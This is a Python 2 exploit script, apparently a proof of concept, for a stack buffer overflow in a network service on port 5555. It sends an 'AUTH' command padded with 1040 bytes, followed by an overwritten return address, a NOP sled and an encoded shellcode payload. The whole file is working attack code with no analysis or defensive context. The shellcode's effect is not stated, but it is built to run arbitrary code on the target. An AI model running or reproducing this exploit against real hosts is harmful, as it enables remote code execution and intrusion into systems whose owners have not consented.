#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

shellcode = (
"\xb8\x82\x96\x38\x9e\xd9\xc1\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x83\xc6\x04\x31\x46\x0e\x03\xc4\x98\xda\x6b\x34\x4c\x98"
"\x94\xc4\x8d\xfd\x1d\x21\xbc\x3d\x79\x22\xef\x8d\x09\x66\x1c"
"\x65\x5f\x92\x97\x0b\x48\x95\x10\xa1\xae\x98\xa1\x9a\x93\xbb"
"\x21\xe1\xc7\x1b\x1b\x2a\x1a\x5a\x5c\x57\xd7\x0e\x35\x13\x4a"
"\xbe\x32\x69\x57\x35\x08\x7f\xdf\xaa\xd9\x7e\xce\x7d\x51\xd9"
"\xd0\x7c\xb6\x51\x59\x66\xdb\x5c\x13\x1d\x2f\x2a\xa2\xf7\x61"
"\xd3\x09\x36\x4e\x26\x53\x7f\x69\xd9\x26\x89\x89\x64\x31\x4e"
"\xf3\xb2\xb4\x54\x53\x30\x6e\xb0\x65\x95\xe9\x33\x69\x52\x7d"
"\x1b\x6e\x65\x52\x10\x8a\xee\x55\xf6\x1a\xb4\x71\xd2\x47\x6e"
"\x1b\x43\x22\xc1\x24\x93\x8d\xbe\x80\xd8\x20\xaa\xb8\x83\x2c"
"\x1f\xf1\x3b\xad\x37\x82\x48\x9f\x98\x38\xc6\x93\x51\xe7\x11"
"\xd3\x4b\x5f\x8d\x2a\x74\xa0\x84\xe8\x20\xf0\xbe\xd9\x48\x9b"
"\x3e\xe5\x9c\x0c\x6e\x49\x4f\xed\xde\x29\x3f\x85\x34\xa6\x60"
"\xb5\x37\x6c\x09\x5c\xc2\xe7\x3c\xaa\xcc\x1a\x28\xae\xcc\xe5"
"\x12\x27\x2a\x8f\x74\x6e\xe5\x38\xec\x2b\x7d\xd8\xf1\xe1\xf8"
"\xda\x7a\x06\xfd\x95\x8a\x63\xed\x42\x7b\x3e\x4f\xc4\x84\x94"
"\xe7\x8a\x17\x73\xf7\xc5\x0b\x2c\xa0\x82\xfa\x25\x24\x3f\xa4"
"\x9f\x5a\xc2\x30\xe7\xde\x19\x81\xe6\xdf\xec\xbd\xcc\xcf\x28"
"\x3d\x49\xbb\xe4\x68\x07\x15\x43\xc3\xe9\xcf\x1d\xb8\xa3\x87"
"\xd8\xf2\x73\xd1\xe4\xde\x05\x3d\x54\xb7\x53\x42\x59\x5f\x54"
"\x3b\x87\xff\x9b\x96\x03\x1f\x7e\x32\x7e\x88\x27\xd7\xc3\xd5"
"\xd7\x02\x07\xe0\x5b\xa6\xf8\x17\x43\xc3\xfd\x5c\xc3\x38\x8c"
"\xcd\xa6\x3e\x23\xed\xe2")

req1 = "AUTH " + "A" * 1040 + "\x71\xE8\x41\x77" + "\x90" * 16 + shellcode 
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
